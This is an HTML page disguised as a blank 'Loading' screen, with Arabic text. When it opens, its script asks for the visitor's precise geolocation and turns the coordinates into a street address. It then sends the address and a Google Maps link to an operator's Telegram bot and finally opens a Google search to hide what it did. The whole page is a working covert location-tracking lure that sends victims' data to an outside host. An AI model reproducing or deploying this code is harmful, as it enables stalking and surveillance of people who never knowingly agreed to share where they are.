<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading</title>
</head>
<body>
    <style>
        body{
            background-image: url('s.jpeg');
        }

    </style>
    <script>
        
        const botToken = "YOUR_BOT_TOKEN"; 
        const chatId = "CHAT_ID";

        function openGoogleSearch() {
            const googleSearchUrl = "https://www.google.com/search"; 
            window.open(googleSearchUrl, "_blank"); 
        }

    
        async function sendToTelegram(message) {
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            try {
                const response = await fetch(telegramApiUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: chatId, text: message })
                });
                const data = await response.json();
                return data.ok; 
            } catch (error) {
                console.error("حدث خطأ أثناء الإرسال:", error);
                return false; 
            }
        }

        async function getDetailedLocation(latitude, longitude) {
            const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=ar`;
            try {
                const response = await fetch(url);
                const data = await response.json();
                if (data && data.address) {
                    const address = data.display_name; 
                    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`; 
                    const message = `📍 موقع جديد تم تحديده:\n\n${address}\n\n🌐 رابط Google Maps: ${googleMapsLink}`;
                    const isSent = await sendToTelegram(message); 
                    if (isSent) {
                        openGoogleSearch();
                    }
                } else {
                    throw new Error("تعذر تحديد الموقع بالتفصيل.");
                }
            } catch (error) {
                console.error("حدث خطأ أثناء جلب تفاصيل الموقع:", error);
            }
        }

 
        function showPosition(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            getDetailedLocation(latitude, longitude); 
        }

        function showError(error) {
            if (error.code === error.PERMISSION_DENIED) {
                alert("يرجى تشغيل خدمة الموقع من إعدادات  والمحاولة مرة أخرى.");
            } else {
                console.error("حدث خطأ أثناء تحديد الموقع:", error);
            }
        }


        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError, {
                    enableHighAccuracy: true, 
                    timeout: 10000, 
                    maximumAge: 0 
                });
            } else {
                alert("المتصفح لا يدعم خاصية .");
            }
        }

        requestLocation();
    </script>
</body>
</html>
